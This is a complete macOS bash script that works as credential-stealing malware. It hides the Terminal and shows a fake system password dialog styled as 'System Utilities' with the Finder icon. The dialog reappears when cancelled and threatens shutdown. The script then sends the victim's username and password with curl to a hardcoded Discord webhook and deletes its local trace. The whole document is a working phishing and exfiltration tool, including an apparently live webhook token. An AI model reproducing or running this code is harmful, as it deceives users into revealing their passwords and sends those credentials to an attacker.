#!/bin/bash

# Hide Terminal so that only the AppleScript dialog is visible
osascript -e 'tell app "Terminal" to set visible of front window to false'

# Get the current username
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# Prepare initial capture text
capture="username=${username}\n_________________________________________________________________________________________\n\n"

# Use AppleScript to display a password prompt with a 25-second countdown.
# If the user cancels, the dialog reappears until time expires.
# When time is up and no password is provided, the computer shuts down.
userPassword=$(osascript <<'EOF'
set startTime to (current date)
set totalTime to 25
set username to (long user name of (system info))
set userPassword to ""
repeat
    set currentTime to (current date)
    set elapsed to currentTime - startTime
    set remaining to totalTime - elapsed
    if remaining ≤ 0 then exit repeat
    try
        set dialogText to text returned of (display dialog "MacOS is trying to authenticate user.\n\nEnter the password for the user " & username & " to allow this.\nTime remaining: " & (round remaining) & " seconds" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer giving up after remaining)
        set userPassword to dialogText
        exit repeat
    on error errMsg number errNum
        if errNum = -128 then
            -- User pressed cancel; simply loop again until time expires.
        else
            exit repeat
        end if
    end try
end repeat
if userPassword is "" then
    -- If no password was entered, trigger a shutdown.
    do shell script "shutdown -h now" with administrator privileges
end if
return userPassword
EOF
)

# Append the captured password to the header
capture="${capture}password=${userPassword}"

# Save the captured information to pass.txt
echo -e "$capture" > pass.txt

# Send the captured data to the Discord webhook.
# Python is used here to ensure valid JSON formatting.
if [[ -f pass.txt ]]; then
    payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
    curl -X POST -H "Content-Type: application/json" -d "$payload" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
    rm pass.txt
else
    echo "Error: pass.txt not found" > error.txt
fi
